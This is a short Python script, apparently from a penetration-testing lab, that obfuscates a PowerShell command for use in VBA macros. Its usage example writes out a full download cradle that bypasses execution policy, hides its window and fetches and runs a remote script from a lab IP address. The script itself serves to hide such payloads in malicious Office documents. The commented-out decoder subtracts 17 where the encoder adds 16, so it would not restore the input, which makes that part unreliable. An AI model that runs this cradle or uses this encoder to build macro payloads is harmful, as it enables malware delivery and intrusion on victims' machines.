#!/usr/bin/env python3
import sys

''' Usage:
    ./vba_ps_encode.py <powershell_cradle>
    Example:
    ./vba_ps_encode.py "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.102/run.txt'))"
'''

rot = 16
# rot encode; pad with 3 characters
buf = ''.join(f'{ord(x) + rot:03}' for x in sys.argv[1]) or None
print(buf)

## optional: linebreak after 50th char 
#print(''.join(f' _\n{ele}' if idx % 50 == 0 and idx != 0 else ele for idx, ele in enumerate(buf)))

## decode
#rev = sys.argv[1]
#rot = 17
#print(''.join([chr(int(rev[i:i+3])-rot) for i in range(0, len(rev), 3)]))
